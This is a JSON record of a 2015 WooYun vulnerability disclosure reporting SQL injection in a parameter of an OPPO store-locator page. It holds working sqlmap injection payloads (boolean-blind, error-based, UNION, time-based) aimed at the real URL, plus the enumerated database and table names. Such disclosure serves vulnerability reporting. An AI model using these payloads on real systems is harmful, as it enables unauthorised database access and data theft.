{"id": 81658, "wybug_id": "wooyun-2015-0153150", "wybug_title": "OPPO某业务站点SQL注入漏洞", "wybug_corp": "广东欧珀移动通讯有限公司", "wybug_author": "奶嘴", "wybug_date": "2015-11-10 10:29", "wybug_open_date": "2015-11-23 07:22", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： © 2005 - 2015 广东欧珀移动通信有限公司 版权所有 粤 ICP 备 08130115 号-5 详细说明：  http://www.oppodigital.com.cn/showroom.php?act=get_store&sell_district_id=1  配置不完善MySQL server error report:Array ( [0] => Array ( [message] => MySQL Query Error ) [1] => Array ( [sql] => select * from oppo_store.sell_store where sell_district_id = ) [2] => Array ( [error] => You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 ) [3] => Array ( [errno] => 1064 ) )   漏洞证明：  Place: GETParameter: sell_district_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: act=get_store&sell_district_id=1 AND 2118=2118    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: act=get_store&sell_district_id=1 AND (SELECT 6473 FROM(SELECT COUNT(*),CONCAT(0x3a7066703a,(SELECT (CASE WHEN (6473=6473) THEN 1 ELSE 0 END)),0x3a6164743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: act=get_store&sell_district_id=1 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7066703a,0x6e74447a705945456451,0x3a6164743a), NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: act=get_store&sell_district_id=1 AND SLEEP(5)---[07:20:33] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.4.5back-end DBMS: MySQL 5.0[07:20:33] [INFO] fetching database names[07:20:34] [INFO] fetching tables for databases: 'ecshop, information_schema, oppo_store, romeo'Database: oppo_store[19 tables]+---------------------------------------+| bd_admin                              || bd_club_user                          || bd_disk                               || bd_disk_ln                            || bd_image                              || bd_order                              || bd_product_registration               || bd_product_service_log                || execute_log                           || log                                   || messagebook                           || messagebook_append_reply              || paypal_txn                            || product_certification_record          || questionnaire                         || sell_district                         || sell_store                            || session                               || user_resetpassword_record             |+---------------------------------------+Database: ecshop[2 tables]+---------------------------------------+| ecs_region                            || ecs_shipping                          |+---------------------------------------+Database: information_schema[17 tables]+---------------------------------------+| CHARACTER_SETS                        || COLLATIONS                            || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS                               || COLUMN_PRIVILEGES                     || KEY_COLUMN_USAGE                      || PROFILING                             || ROUTINES                              || SCHEMATA                              || SCHEMA_PRIVILEGES                     || STATISTICS                            || TABLES                                || TABLE_CONSTRAINTS                     || TABLE_PRIVILEGES                      || TRIGGERS                              || USER_PRIVILEGES                       || VIEWS                                 |+---------------------------------------+Database: romeo[3 tables]+---------------------------------------+| inventory_item                        || inventory_item_detail                 || shipment                              |+---------------------------------------+   修复方案：  你们懂   版权声明：转载请注明来源 奶嘴@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-23 07:22 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}